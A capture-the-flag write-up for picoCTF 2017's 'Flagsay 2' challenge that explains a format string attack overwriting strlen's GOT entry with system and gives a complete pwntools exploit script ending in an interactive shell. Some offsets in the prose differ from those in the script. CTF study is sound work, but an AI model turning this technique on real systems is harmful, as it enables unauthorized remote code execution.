# Flagsay 2
#### Writeup by hgarrereyn
* **Binary Exploitation**
* *150 points*
* Description: Apparently I messed up using system(). I'm pretty sure this one is secure though! I hope [flagsay-2](https://github.com/hgarrereyn/Th3g3ntl3man-CTF-Writeups/raw/ae8966a89649c86e35ed47c73224ed435234f47c/2017/picoCTF_2017/problems/binary/Flagsay_2/flagsay-2) is just as exhilarating as the the first one! [Source](https://github.com/hgarrereyn/Th3g3ntl3man-CTF-Writeups/raw/ae8966a89649c86e35ed47c73224ed435234f47c/2017/picoCTF_2017/problems/binary/Flagsay_2/flagsay-2.c). Connect on shell2017.picoctf.com:19884.

# Solution

This program was vulnerable to a format string attack. However it was made difficult because the buffer was not stored on the stack. Additionally ASLR was enabled and therefore stack/function addresses could not be hardcoded.

Specifically, line `61` was vulnerable by calling `printf` on a user supplied buffer:

```c
printf(tempFlag);
```

In order to solve this problem, I started searching for pointers on the stack that either pointed into libc (so I could leak system) or pointed to stack addresses I could reach within the format string attack.

Additionally, I realized that if I wanted to overwrite the GOT table, I needed to be able to do it in a single format string attack. If I tried to do it in two, the program would jump to some undefined location. Therefore I needed to prepare two pointers on the stack pointing to `<strlen@GOT>` and `<strlen@GOT + 2>` so I could do two `$hn` writes at once.

I found the following useful pointers:

* `%17` pointed to `%53` on the stack. So I could perform a multistep format string attack to get an arbitrary write such as: `%17$n` then `%53$n`.
* `%23` and `%24` had pointers to addresses near the one I wanted to overwrite so I was able to overwrite just one or two bytes and get them each pointing to the GOT table (2 bytes apart)
* `%2` was pointing into libc, so I could use it as a reference to calculate the address of `system`


# Step-by-step

During the competition, I found it easier to crack this binary by hand, typing in lines manually.

As part of this writeup, I wrote a script for completeness.

### Instructions:

*For all writes, subtract 129 initially as this is how many characters are printed as part of the flag*

1. System address is `%2 + 1489168`
2. s1(`%23`) is at `%22 - 24`
	* Write the lower two bytes of this to `%17`
	* Write `0x84` to lowest byte of `%53`
3. s2(`%24`) = `s1 + 4`
	* Write the lower two bytes of this to `%17`
	* Write `0x9986` to lower two bytes of `%53`
4. Write higher two bytes of system address to `%23` and write lower two bytes of system address to `%24` (this overwrites `strlen@GOT` with system)
5. send `sh`
6. You've got shell!

# Script

[**exploitFlagsay2.py**](https://github.com/hgarrereyn/Th3g3ntl3man-CTF-Writeups/raw/ae8966a89649c86e35ed47c73224ed435234f47c/2017/picoCTF_2017/problems/binary/Flagsay_2/exploitFlagsay2.py)

```python
# By Harrison Green <hgarrereyn>

from pwn import *
import re

# Connect to the server
sock = remote('shell2017.picoctf.com', 19884)

# Helper function to consume input
def n():
	a = sock.recv()
	print(a)
	return a


# Calculate system address
sock.send('<%2$lx>\n')
resp = n()
ref_addr = int(re.search(r'<([a-f0-9]*)>', resp).group(1), 16)
sys_addr = ref_addr - 1488960

print('System at: ' + hex(sys_addr))

# Get stack address
sock.send('<%22$lx>\n')
resp = n()
ref_addr = int(re.search(r'<([a-f0-9]*)>', resp).group(1), 16)
s1 = ref_addr - 24
s2 = s1 + 4

# Create first GOT pointer
sock.send('%' + str((s1 & 0xFFFF) - 129) + 'x%17$hn\n')
sock.send('%' + str(259) + 'x%53$hhn\n')

# Create second GOT pointer (first + 2)
sock.send('%' + str((s2 & 0xFFFF) - 129) + 'x%17$hn\n')
sock.send('%' + str(39173) + 'x%53$hn\n')

# Use GOT addresses to overwrite strlen with system
sys_high = (sys_addr & 0xFFFF0000) >> 16
sys_low = (sys_addr & 0xFFFF)

print(hex(sys_high))
print(hex(sys_low))

# make sure the second write is greater
if (sys_high > sys_low):
	sock.send('%' + str(sys_low - 129) + 'x%23$hn' + '%' + str(sys_high - sys_low) + 'x%24$hn\n')
else:
	sock.send('%' + str(sys_high - 129) + 'x%24$hn' + '%' + str(sys_low - sys_high) + 'x%23$hn\n')

sock.send('sh\n')

# We've got shell
sock.interactive()
```
